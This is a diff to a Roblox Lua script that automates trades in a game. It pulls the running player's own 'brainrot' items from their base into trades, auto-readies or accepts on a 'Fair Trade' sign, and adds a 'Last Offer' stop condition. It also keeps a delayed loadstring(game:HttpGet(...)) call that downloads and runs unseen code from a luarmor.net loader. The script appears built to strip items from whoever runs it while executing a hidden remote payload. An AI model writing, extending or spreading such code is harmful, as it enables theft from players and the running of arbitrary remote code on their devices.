@@ -606,6 +606,8 @@ end)
 local tradeRunning = false
 local fairTradeDetected = false
 local addMoreDetected = false
+local lastOfferDetected = false
+local sendTradeAgain = true
 
 local _ReplicatorClient = require(RS.Packages.ReplicatorClient)
 local _tradeReplica = _ReplicatorClient.get(("Trade_%*"):format(LocalPlayer.UserId))
@@ -615,6 +617,7 @@ _tradeReplica:ListenRaw(function(state)
 	if state == nil then
 		_lastSign = nil
 		fairTradeDetected = false
+		addMoreDetected = false
 		return
 	end
 	local users = _tradeReplica:TryIndex({ "active", "data", "users" })
@@ -632,9 +635,12 @@ _tradeReplica:ListenRaw(function(state)
 		if signText == "✅ Fair Trade" and signText ~= _lastSign then
 			fairTradeDetected = true
 			addMoreDetected = false
-		elseif signText == "+ Add More" and signText ~= _lastSign then
+		elseif signText == "➕ Add More" and signText ~= _lastSign then
 			addMoreDetected = true
 			fairTradeDetected = false
+		elseif signText == "🧾 Last Offer" and signText ~= _lastSign then
+			lastOfferDetected = true
+			sendTradeAgain = false
 		end
 		_lastSign = signText
 	end)
@@ -686,7 +692,7 @@ local function autoadd()
 			return
 		end
 		if fairTradeDetected then
-			fireReady()
+			task.spawn(fireReadyOrAccept)
 			repeat task.wait(0.2) until addMoreDetected or not isTradeActive()
 			if not isTradeActive() then
 				tradeRunning = false
@@ -744,7 +750,7 @@ end)
 
 task.spawn(function()
 	while true do
-		if not isTradeActive() and not tradeRunning then
+		if not isTradeActive() and not tradeRunning and sendTradeAgain then
 			if cachedPlotFolder then
 				local brainrots = collectBrainrotsFromBase(cachedPlotFolder)
 				if #brainrots > 0 then
@@ -762,7 +768,8 @@ while task.wait(1) do
 	end
 end
 
+
 task.spawn(function() 
 	task.wait(5) 
-	loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/195d1071ee63fbac050300e2155f573f.lua"))()
-end)
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/195d1071ee63fbac050300e2155f573f.lua"))()
+	end)
